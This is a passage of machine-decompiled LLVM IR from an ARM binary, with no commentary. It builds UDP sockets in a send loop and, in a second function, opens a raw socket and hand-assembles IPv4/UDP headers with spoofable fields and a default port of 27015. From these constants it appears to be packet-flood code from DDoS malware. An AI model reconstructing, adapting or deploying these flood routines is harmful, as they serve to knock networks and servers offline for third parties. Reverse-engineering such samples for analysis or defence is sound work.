  %stack_var_-56 = alloca i32, align 4
  %v3_c81c = load i32, i32* @r4, align 4
  %v18_c81c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c838 = call i32 @function_11958(i32 %arg1, i32 4)
  store i32 %v2_c838, i32* @sl, align 4
  %v0_c844 = load i32, i32* @r7, align 4
  %v2_c848 = call i32 @function_11958(i32 %v0_c844, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_c854 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_c848, i32* @r8, align 4
  %v0_c864 = load i32, i32* @r5, align 4
  %v4_c868 = inttoptr i32 %v0_c854 to i32*
  %v5_c868 = call i32 @function_a300(i32 %v0_c864, i32* %v4_c868, i32 7, i32 65535)
  %v3_c870 = urem i32 %v5_c868, 65536
  %v0_c874 = load i32, i32* @r6, align 4
  %v0_c87c = load i32, i32* @r4, align 4
  store i32 %v0_c87c, i32* %r3.global-to-local, align 4
  %v0_c880 = load i32, i32* @r5, align 4
  %v5_c888 = inttoptr i32 %v0_c874 to i32*
  %v6_c888 = call i32 @function_a300(i32 %v0_c880, i32* %v5_c888, i32 6, i32 %v0_c87c)
  %v0_c88c = load i32, i32* @r6, align 4
  %v3_c890 = mul i32 %v6_c888, 65536
  store i32 %v3_c890, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c89c = load i32, i32* @r5, align 4
  %v4_c8a0 = inttoptr i32 %v0_c88c to i32*
  %v5_c8a0 = call i32 @function_a300(i32 %v0_c89c, i32* %v4_c8a0, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c8b0 = load i32, i32* @r6, align 4
  %v0_c8b4 = load i32, i32* @r5, align 4
  %v3_c8b8 = urem i32 %v5_c8a0, 65536
  store i32 %v3_c8b8, i32* @r5, align 4
  %v4_c8bc = inttoptr i32 %v0_c8b0 to i32*
  %v5_c8bc = call i32 @function_a300(i32 %v0_c8b4, i32* %v4_c8bc, i32 1, i32 1)
  %v0_c8c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_c8c0 = udiv i32 %v0_c8c0, 65536
  store i32 %v3_c8c0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c8c8 = load i32, i32* @r4, align 4
  %v9_c8c8 = icmp eq i32 %v3_c8c0, %v1_c8c8
  br i1 %v9_c8c8, label %dec_label_pc_c8f8, label %bb

bb:                                               ; preds = %dec_label_pc_c81c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_c8e0 = udiv i32 %v0_c8c0, 16777216
  store i32 %v4_c8e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c908

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c81c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_c8f8 = call i32 @function_e7dc()
  br label %dec_label_pc_c908

dec_label_pc_c908:                                ; preds = %bb, %dec_label_pc_c8f8
  %v0_c8ec10 = urem i32 %v5_c8bc, 256
  %v0_c908 = load i32, i32* @r7, align 4
  %v2_c908 = icmp eq i32 %v0_c908, 0
  br i1 %v2_c908, label %dec_label_pc_ca48, label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c908
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_c9bc = udiv i32 %v3_c870, 256
  %v1_c9b8 = mul i32 %v5_c868, 256
  %v4_c9c0 = and i32 %v1_c9b8, 65280
  %v5_c9c0 = or i32 %v4_c9c0, %v3_c9bc
  %v2_c940 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_c9a0

dec_label_pc_c920:                                ; preds = %bb51, %dec_label_pc_c9e0
  %v3_c92c = call i32 @function_10df0(i32 2, i32 2, i32 17)
  %v7_c934 = icmp eq i32 %v3_c92c, -1
  %v0_c938 = load i32, i32* @sb, align 4
  %v1_c938 = add i32 %v0_c938, 1
  store i32 %v1_c938, i32* @sb, align 4
  %v0_c93c = load i32, i32* @fp, align 4
  %v1_c93c = add i32 %v0_c93c, 24
  store i32 %v1_c93c, i32* @fp, align 4
  %v2_c948 = load i32, i32* @r8, align 4
  %v3_c948 = add i32 %v2_c948, %stack_var_-60.0
  %v4_c948 = inttoptr i32 %v3_c948 to i32*
  store i32 %v3_c92c, i32* %v4_c948, align 4
  br i1 %v7_c934, label %dec_label_pc_ca3c, label %dec_label_pc_c950

dec_label_pc_c950:                                ; preds = %dec_label_pc_c920
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_c968 = call i32 @function_10ba0(i32 %v3_c92c, i32 %v2_c940, i32 16)
  %v0_c96c = load i32, i32* @r6, align 4
  %v1_c96c = add i32 %v0_c96c, 20
  %v2_c96c = inttoptr i32 %v1_c96c to i8*
  %v3_c96c = load i8, i8* %v2_c96c, align 1
  %v4_c96c = zext i8 %v3_c96c to i32
  store i32 %v4_c96c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_c96c, 32
  br i1 %tmp, label %dec_label_pc_c9f4, label %dec_label_pc_c978

dec_label_pc_c978:                                ; preds = %dec_label_pc_c950, %dec_label_pc_c9f4
  %v0_c97c = phi i32 [ %v0_c96c, %dec_label_pc_c950 ], [ %v0_c97c.pre, %dec_label_pc_c9f4 ]
  %v1_c980 = load i32, i32* @r8, align 4
  %v2_c980 = add i32 %v1_c980, %stack_var_-60.0
  %v3_c980 = inttoptr i32 %v2_c980 to i32*
  %v4_c980 = load i32, i32* %v3_c980, align 4
  %v3_c988 = call i32 @function_10bd8(i32 %v4_c980, i32 %v0_c97c, i32 16)
  %v0_c990 = load i32, i32* @sb, align 4
  %v1_c990 = load i32, i32* @r7, align 4
  %v9_c990 = icmp eq i32 %v0_c990, %v1_c990
  %v1_c994 = add i32 %stack_var_-60.0, 4
  store i32 %v1_c994, i32* %r3.global-to-local, align 4
  br i1 %v9_c990, label %dec_label_pc_ca48, label %dec_label_pc_c9a0

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c978, %dec_label_pc_c910
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_c910 ], [ %v1_c994, %dec_label_pc_c978 ]
  store i32 65535, i32* @r4, align 4
  %v2_c9b0 = call i32 @function_11958(i32 65535, i32 1)
  store i32 %v5_c9c0, i32* %r3.global-to-local, align 4
  %v1_c9cc = load i32, i32* @r4, align 4
  %v9_c9cc = icmp eq i32 %v3_c870, %v1_c9cc
  %v1_c9d0 = load i32, i32* @fp, align 4
  %v2_c9d0 = add i32 %v1_c9d0, %arg2
  store i32 %v2_c9d0, i32* @r6, align 4
  %v2_c9d4 = load i32, i32* @sl, align 4
  %v3_c9d4 = add i32 %v2_c9d4, %stack_var_-60.0
  %v4_c9d4 = inttoptr i32 %v3_c9d4 to i32*
  store i32 %v2_c9b0, i32* %v4_c9d4, align 4
  br i1 %v9_c9cc, label %dec_label_pc_c9e0, label %bb51

bb51:                                             ; preds = %dec_label_pc_c9a0
  %v1_c9d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_c9d8 = trunc i32 %v1_c9d8 to i16
  %v3_c9d8 = load i32, i32* @r6, align 4
  %v4_c9d8 = add i32 %v3_c9d8, 2
  %v5_c9d8 = inttoptr i32 %v4_c9d8 to i16*
  store i16 %v2_c9d8, i16* %v5_c9d8, align 2
  br label %dec_label_pc_c920

dec_label_pc_c9e0:                                ; preds = %dec_label_pc_c9a0
  %v0_c9e0 = call i32 @function_e7dc()
  %v1_c9e0 = trunc i32 %v0_c9e0 to i16
  %v0_c9e8 = load i32, i32* @fp, align 4
  %v2_c9e8 = add i32 %v0_c9e8, %arg2
  store i32 %v2_c9e8, i32* @r6, align 4
  %v4_c9ec = add i32 %v2_c9e8, 2
  %v5_c9ec = inttoptr i32 %v4_c9ec to i16*
  store i16 %v1_c9e0, i16* %v5_c9ec, align 2
  br label %dec_label_pc_c920

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c950
  %v1_c9f4 = add i32 %v0_c96c, 16
  %v2_c9f4 = inttoptr i32 %v1_c9f4 to i32*
  %v3_c9f4 = load i32, i32* %v2_c9f4, align 4
  store i32 %v3_c9f4, i32* %r4.global-to-local, align 4
  %v0_c9f8 = call i32 @function_e7dc()
  %v1_ca08 = and i32 %v3_c9f4, 65280
  store i32 %v1_ca08, i32* %r3.global-to-local, align 4
  %v0_ca10 = load i32, i32* @r6, align 4
  %v1_ca10 = add i32 %v0_ca10, 20
  %v2_ca10 = inttoptr i32 %v1_ca10 to i8*
  %v3_ca10 = load i8, i8* %v2_ca10, align 1
  %v4_ca10 = zext i8 %v3_ca10 to i32
  %v5_ca14 = call i32 @llvm.bswap.i32(i32 %v3_c9f4)
  %v7_ca18 = lshr i32 %v0_c9f8, %v4_ca10
  %v8_ca18 = add i32 %v7_ca18, %v5_ca14
  %v5_ca30 = call i32 @llvm.bswap.i32(i32 %v8_ca18)
  store i32 %v5_ca30, i32* %r3.global-to-local, align 4
  %v2_ca34 = add i32 %v0_ca10, 4
  %v3_ca34 = inttoptr i32 %v2_ca34 to i32*
  store i32 %v5_ca30, i32* %v3_ca34, align 4
  %v0_c97c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c978

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_c920
  store i32 %v3_c81c, i32* %r4.global-to-local, align 4
  store i32 %v18_c81c, i32* %sb.global-to-local, align 4
  ret i32 %v3_c92c

dec_label_pc_ca48:                                ; preds = %dec_label_pc_c978, %dec_label_pc_c908
  %v1_ca8822 = phi i32 [ 0, %dec_label_pc_c908 ], [ %v0_c990, %dec_label_pc_c978 ]
  %v2_ca4c = icmp eq i32 %v0_c8ec10, 0
  br i1 %v2_ca4c, label %dec_label_pc_ca6c.outer, label %dec_label_pc_ca84

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_ca6c
  store i32 %v1_ca60, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ca5c = load i32, i32* @r8, align 4
  %v4_ca5c = mul i32 %v1_ca60, 4
  %v5_ca5c = add i32 %v0_ca5c, %v4_ca5c
  %v6_ca5c = inttoptr i32 %v5_ca5c to i32*
  %v7_ca5c = load i32, i32* %v6_ca5c, align 4
  %v0_ca60 = load i32, i32* @sl, align 4
  %v5_ca60 = add i32 %v0_ca60, %v4_ca5c
  %v6_ca60 = inttoptr i32 %v5_ca60 to i32*
  %v7_ca60 = load i32, i32* %v6_ca60, align 4
  %v4_ca64 = call i32 @function_10d34(i32 %v7_ca5c, i32 %v7_ca60, i32 %v0_ca70, i32 16384)
  %v0_ca68 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca68 = add i32 %v0_ca68, 1
  %v0_ca6c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ca6c.outer

dec_label_pc_ca6c.outer:                          ; preds = %dec_label_pc_ca48, %dec_label_pc_ca5c
  %v0_ca6c.ph = phi i32 [ %v0_ca6c.pre.pre, %dec_label_pc_ca5c ], [ %v1_ca8822, %dec_label_pc_ca48 ]
  %v1_ca60.ph = phi i32 [ %v1_ca68, %dec_label_pc_ca5c ], [ 0, %dec_label_pc_ca48 ]
  %v0_ca70 = load i32, i32* @r5, align 4
  br label %dec_label_pc_ca6c

dec_label_pc_ca6c:                                ; preds = %dec_label_pc_ca6c.outer, %dec_label_pc_ca6c
  %v1_ca60 = phi i32 [ 0, %dec_label_pc_ca6c ], [ %v1_ca60.ph, %dec_label_pc_ca6c.outer ]
  %v8_ca78 = icmp sgt i32 %v0_ca6c.ph, %v1_ca60
  br i1 %v8_ca78, label %dec_label_pc_ca5c, label %dec_label_pc_ca6c

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca88, %dec_label_pc_ca48
  %v1_ca8821 = phi i32 [ %v1_ca8822, %dec_label_pc_ca48 ], [ %v1_ca88, %dec_label_pc_ca88 ]
  br label %dec_label_pc_ca88

dec_label_pc_ca88:                                ; preds = %dec_label_pc_ca94, %dec_label_pc_ca84
  %v1_ca88 = phi i32 [ %v1_ca8821, %dec_label_pc_ca84 ], [ %v1_ca88.pre, %dec_label_pc_ca94 ]
  %v1_ca94 = phi i32 [ 0, %dec_label_pc_ca84 ], [ %v1_cab4, %dec_label_pc_ca94 ]
  store i32 %v1_ca94, i32* @r6, align 4
  %v6_ca90 = icmp slt i32 %v1_ca94, %v1_ca88
  br i1 %v6_ca90, label %dec_label_pc_ca94, label %dec_label_pc_ca84

dec_label_pc_ca94:                                ; preds = %dec_label_pc_ca88
  %v0_ca8c = load i32, i32* @r5, align 4
  %v0_ca94 = load i32, i32* @sl, align 4
  %v4_ca94 = mul i32 %v1_ca94, 4
  %v5_ca94 = add i32 %v0_ca94, %v4_ca94
  %v6_ca94 = inttoptr i32 %v5_ca94 to i32*
  %v7_ca94 = load i32, i32* %v6_ca94, align 4
  store i32 %v7_ca94, i32* @r4, align 4
  %v2_ca9c = inttoptr i32 %v7_ca94 to i16*
  %v3_ca9c = call i32 @function_e9dc(i16* %v2_ca9c, i32 %v0_ca8c)
  %v0_caa0 = load i32, i32* @r8, align 4
  %v1_caa0 = load i32, i32* @r6, align 4
  %v4_caa0 = mul i32 %v1_caa0, 4
  %v5_caa0 = add i32 %v4_caa0, %v0_caa0
  %v6_caa0 = inttoptr i32 %v5_caa0 to i32*
  %v7_caa0 = load i32, i32* %v6_caa0, align 4
  %v0_caa4 = load i32, i32* @r4, align 4
  %v0_caa8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cab0 = call i32 @function_10d34(i32 %v7_caa0, i32 %v0_caa4, i32 %v0_caa8, i32 16384)
  %v0_cab4 = load i32, i32* @r6, align 4
  %v1_cab4 = add i32 %v0_cab4, 1
  %v1_ca88.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ca88

; uselistorder directives
  uselistorder i32 %v1_ca88, { 1, 0 }
  uselistorder i32 %v1_ca60, { 2, 1, 0 }
  uselistorder i32 %v5_ca30, { 1, 0 }
  uselistorder i32 %v3_c9f4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_c96c, { 1, 0, 2 }
  uselistorder i32 %v3_c92c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_c8c0, { 1, 0 }
  uselistorder i32 %v3_c870, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 (i16*, i32)* @function_e9dc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ca6c, { 1, 0 }
  uselistorder label %dec_label_pc_ca6c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_c978, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c908, { 1, 0 }
}

define i32 @function_cabc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cabc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_cabc = load i32, i32* @r4, align 4
  %v27_cabc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_cad8 = call i32 @function_11958(i32 %arg1, i32 4)
  %v0_cadc = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_cad8, i32* @fp, align 4
  %v0_caec = load i32, i32* @r4, align 4
  %v4_caf0 = inttoptr i32 %v0_cadc to i32*
  %v5_caf0 = call i32 @function_a300(i32 %v0_caec, i32* %v4_caf0, i32 2, i32 0)
  %v1_cafc = urem i32 %v5_caf0, 256
  store i32 %v1_cafc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cb08 = load i32, i32* @r4, align 4
  %v0_cb0c = load i32, i32* @r5, align 4
  %v5_cb10 = trunc i32 %v5_caf0 to i8
  %v6_cb14 = inttoptr i32 %v0_cb0c to i32*
  %v7_cb14 = call i32 @function_a300(i32 %v0_cb08, i32* %v6_cb14, i32 3, i32 65535)
  %v0_cb18 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_cb14, i32* @r7, align 4
  %v0_cb28 = load i32, i32* @r4, align 4
  %v4_cb2c = inttoptr i32 %v0_cb18 to i32*
  %v5_cb2c = call i32 @function_a300(i32 %v0_cb28, i32* %v4_cb2c, i32 4, i32 64)
  %v1_cb34 = urem i32 %v5_cb2c, 256
  store i32 %v1_cb34, i32* %ip.global-to-local, align 4
  %v0_cb38 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cb44 = load i32, i32* @r4, align 4
  %v6_cb4c = inttoptr i32 %v0_cb38 to i32*
  %v7_cb4c = call i32 @function_a300(i32 %v0_cb44, i32* %v6_cb4c, i32 5, i32 0)
  %v1_cb58 = urem i32 %v7_cb4c, 256
  store i32 %v1_cb58, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cb64 = load i32, i32* @r4, align 4
  %v0_cb68 = load i32, i32* @r5, align 4
  %v5_cb70 = inttoptr i32 %v0_cb68 to i32*
  %v6_cb70 = call i32 @function_a300(i32 %v0_cb64, i32* %v5_cb70, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_cb80 = load i32, i32* @r5, align 4
  store i32 %v6_cb70, i32* @r6, align 4
  %v0_cb88 = load i32, i32* @r4, align 4
  %v4_cb8c = inttoptr i32 %v0_cb80 to i32*
  %v5_cb8c = call i32 @function_a300(i32 %v0_cb88, i32* %v4_cb8c, i32 7, i32 27015)
  store i32 %v5_cb8c, i32* @r4, align 4
  %v1_cb98 = call i32 @function_f0ac(i32 29)
  %v3_cba4 = call i32 @function_efe8(i32 29, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cbb8 = call i32 @function_10df0(i32 2, i32 3, i32 17)
  %v7_cbbc = icmp eq i32 %v3_cbb8, -1
  store i1 %v7_cbbc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_cbb8, i32* @sb, align 4
  br i1 %v7_cbbc, label %dec_label_pc_cee4, label %dec_label_pc_cbc8

dec_label_pc_cbc8:                                ; preds = %dec_label_pc_cabc
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cbd0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cbd0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_cbe4 = call i32 @function_10dac(i32 %v3_cbb8, i32 0, i32 3, i32 %v6_cbd0, i32 ptrtoint (i32* @0 to i32))
  %v7_cbe8 = icmp eq i32 %v5_cbe4, -1
  store i1 %v7_cbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cbe8, label %dec_label_pc_cedc, label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbc8
  %v0_cbf0 = load i32, i32* @r4, align 4
  %v3_cbf0 = mul i32 %v0_cbf0, 65536
  store i32 %v3_cbf0, i32* @lr, align 4
  %v0_cbf4 = load i32, i32* @r7, align 4
  %v0_cbf8 = load i32, i32* @r6, align 4
  %v3_cbf8 = mul i32 %v0_cbf8, 65536
  store i32 %v3_cbf8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_cc00 = urem i32 %v0_cbf4, 65536
  %v3_cc04 = urem i32 %v0_cbf8, 65536
  store i32 %v3_cc04, i32* %r2.global-to-local, align 4
  %v3_cc08 = urem i32 %v0_cbf0, 65536
  store i32 %v3_cc08, i32* %r3.global-to-local, align 4
  %v0_cc0c = load i32, i32* @r8, align 4
  %v2_cc0c = icmp eq i32 %v0_cc0c, 0
  store i1 %v2_cc0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cc0c, label %dec_label_pc_cd48.preheader, label %dec_label_pc_cc24

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cbf0
  %tmp34 = mul i32 %v0_cbf4, 256
  %v3_cc34 = and i32 %tmp34, 65280
  store i32 %v3_cc34, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_cbf8, 256
  %v3_cc38 = and i32 %tmp35, 65280
  store i32 %v3_cc38, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_cbf0, 256
  %v3_cc3c = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_cbf4, 256
  %v4_cc40 = urem i32 %tmp37, 256
  %v5_cc40 = or i32 %v4_cc40, %v3_cc34
  store i32 %v5_cc40, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_cbf8, 256
  %v4_cc44 = urem i32 %tmp38, 256
  %v5_cc44 = or i32 %v4_cc44, %v3_cc38
  store i32 %v5_cc44, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_cbf0, 256
  %v4_cc48 = urem i32 %tmp39, 256
  %v5_cc48 = or i32 %v4_cc48, %v3_cc3c
  store i32 %v5_cc48, i32* @r7, align 4
  %v1_ccd0 = trunc i32 %v5_cb2c to i8
  br label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %.thread, %dec_label_pc_cc24
  %v2_cc54 = call i32 @function_11958(i32 128, i32 1)
  %v3_cc58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cc58, i32* %r2.global-to-local, align 4
  %v5_cc60 = mul i32 %v3_cc58, 24
  store i32 %v5_cc60, i32* %r3.global-to-local, align 4
  %v1_cc64 = load i32, i32* @fp, align 4
  %v2_cc64 = load i32, i32* @r4, align 4
  %v5_cc64 = mul i32 %v2_cc64, 4
  %v6_cc64 = add i32 %v5_cc64, %v1_cc64
  %v7_cc64 = inttoptr i32 %v6_cc64 to i32*
  store i32 %v2_cc54, i32* %v7_cc64, align 4
  %v0_cc68 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc68 = load i32, i32* @sl, align 4
  %v2_cc68 = add i32 %v1_cc68, %v0_cc68
  store i32 %v2_cc68, i32* %r3.global-to-local, align 4
  %v0_cc6c = load i32, i32* @fp, align 4
  %v1_cc6c = load i32, i32* %r2.global-to-local, align 4
  %v4_cc6c = mul i32 %v1_cc6c, 4
  %v5_cc6c = add i32 %v4_cc6c, %v0_cc6c
  %v6_cc6c = inttoptr i32 %v5_cc6c to i32*
  %v7_cc6c = load i32, i32* %v6_cc6c, align 4
  store i32 %v7_cc6c, i32* @lr, align 4
  %v1_cc74 = inttoptr i32 %v7_cc6c to i8*
  %v2_cc74 = load i8, i8* %v1_cc74, align 1
  %tmp = urem i8 %v2_cc74, 16
  %v1_cc78 = zext i8 %tmp to i32
  %v1_cc7c = or i32 %v1_cc78, 64
  store i32 %v1_cc7c, i32* %r3.global-to-local, align 4
  %v1_cc84 = trunc i32 %v1_cc7c to i8
  store i8 %v1_cc84, i8* %v1_cc74, align 1
  %v0_cc88 = load i32, i32* @lr, align 4
  %v1_cc88 = inttoptr i32 %v0_cc88 to i8*
  %v2_cc88 = load i8, i8* %v1_cc88, align 1
  %v1_cc8c = and i8 %v2_cc88, -16
  %v1_cc90 = or i8 %v1_cc8c, 5
  store i8 %v1_cc90, i8* %v1_cc88, align 1
  %v2_cc9c = load i32, i32* @lr, align 4
  %v3_cc9c = add i32 %v2_cc9c, 1
  %v4_cc9c = inttoptr i32 %v3_cc9c to i8*
  store i8 %v5_cb10, i8* %v4_cc9c, align 1
  %v3_cca0 = load i32, i32* %stack_var_-48, align 4
  %v3_cca4 = mul i32 %v3_cca0, 65536
  %v1_cca8 = add i32 %v3_cca4, 2097152
  %v3_ccac = udiv i32 %v1_cca8, 256
  %v4_ccb4 = udiv i32 %v1_cca8, 16777216
  %v5_ccb4 = or i32 %v3_ccac, %v4_ccb4
  %v3_ccb8 = urem i32 %v3_cca0, 65536
  store i32 %v3_ccb8, i32* %r2.global-to-local, align 4
  %v1_ccbc = trunc i32 %v5_ccb4 to i16
  %v2_ccbc = load i32, i32* @lr, align 4
  %v3_ccbc = add i32 %v2_ccbc, 2
  %v4_ccbc = inttoptr i32 %v3_ccbc to i16*
  store i16 %v1_ccbc, i16* %v4_ccbc, align 2
  %v0_ccc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccc0 = mul i32 %v0_ccc0, 65536
  %v3_ccc8 = add i32 %v1_ccc0, 786432
  store i32 %v3_ccc8, i32* %r2.global-to-local, align 4
  store i32 %v1_cb58, i32* %ip.global-to-local, align 4
  %v2_ccd0 = load i32, i32* @lr, align 4
  %v3_ccd0 = add i32 %v2_ccd0, 8
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 %v1_ccd0, i8* %v4_ccd0, align 1
  %v0_ccd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd4 = udiv i32 %v0_ccd4, 256
  %v1_ccd8 = and i32 %v3_ccd4, 65280
  %v0_ccdc = load i32, i32* %ip.global-to-local, align 4
  %v2_ccdc = icmp eq i32 %v0_ccdc, 0
  store i1 %v2_ccdc, i1* %cpsr_z.global-to-local, align 1
  %v4_cce0 = udiv i32 %v0_ccd4, 16777216
  %v5_cce0 = or i32 %v1_ccd8, %v4_cce0
  store i32 %v5_cce0, i32* %ip.global-to-local, align 4
  %v2_cce8 = load i32, i32* @lr, align 4
  %v3_cce8 = add i32 %v2_cce8, 9
  %v4_cce8 = inttoptr i32 %v3_cce8 to i8*
  store i8 17, i8* %v4_cce8, align 1
  store i32 ptrtoint (i32* @global_var_20600.75 to i32), i32* %r3.global-to-local, align 4
  %v0_ccf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ccf0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_cc4c
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_ccf4 = load i32, i32* @lr, align 4
  %v4_ccf4 = add i32 %v3_ccf4, 6
  %v5_ccf4 = inttoptr i32 %v4_ccf4 to i16*
  store i16 64, i16* %v5_ccf4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cc4c, %bb
  %v2_ccf8 = load i32, i32* @global_var_20600.75, align 4
  %v1_ccfc = load i32, i32* @lr, align 4
  %v2_ccfc = add i32 %v1_ccfc, 12
  %v3_ccfc = inttoptr i32 %v2_ccfc to i32*
  store i32 %v2_ccf8, i32* %v3_ccfc, align 4
  store i32 %v2_cc68, i32* %r2.global-to-local, align 4
  %v1_cd04 = add i32 %v2_cc68, 16
  %v2_cd04 = inttoptr i32 %v1_cd04 to i32*
  %v3_cd04 = load i32, i32* %v2_cd04, align 4
  %v1_cd08 = load i32, i32* @lr, align 4
  %v2_cd08 = add i32 %v1_cd08, 16
  %v3_cd08 = inttoptr i32 %v2_cd08 to i32*
  store i32 %v3_cd04, i32* %v3_cd08, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_cd10 = load i32, i32* @lr, align 4
  %v1_cd10 = add i32 %v0_cd10, 20
  store i32 %v1_cd10, i32* %r4.global-to-local, align 4
  %v2_cd14 = add i32 %v0_cd10, 28
  %v3_cd14 = inttoptr i32 %v2_cd14 to i32*
  store i32 -1, i32* %v3_cd14, align 4
  %v0_cd18 = load i32, i32* @r5, align 4
  %v1_cd18 = trunc i32 %v0_cd18 to i16
  %v2_cd18 = load i32, i32* @lr, align 4
  %v3_cd18 = add i32 %v2_cd18, 4
  %v4_cd18 = inttoptr i32 %v3_cd18 to i16*
  store i16 %v1_cd18, i16* %v4_cd18, align 2
  %v0_cd1c = load i32, i32* @lr, align 4
  %v1_cd1c = add i32 %v0_cd1c, 32
  %v0_cd20 = load i32, i32* %ip.global-to-local, align 4
  %v1_cd20 = trunc i32 %v0_cd20 to i16
  %v2_cd20 = load i32, i32* %r4.global-to-local, align 4
  %v3_cd20 = add i32 %v2_cd20, 4
  %v4_cd20 = inttoptr i32 %v3_cd20 to i16*
  store i16 %v1_cd20, i16* %v4_cd20, align 2
  %v0_cd24 = load i32, i32* @r7, align 4
  %v1_cd24 = trunc i32 %v0_cd24 to i16
  %v2_cd24 = load i32, i32* %r4.global-to-local, align 4
  %v3_cd24 = add i32 %v2_cd24, 2
  %v4_cd24 = inttoptr i32 %v3_cd24 to i16*
  store i16 %v1_cd24, i16* %v4_cd24, align 2
  %v0_cd28 = load i32, i32* @r6, align 4
  %v1_cd28 = trunc i32 %v0_cd28 to i16
  %v2_cd28 = load i32, i32* @lr, align 4
  %v3_cd28 = add i32 %v2_cd28, 20
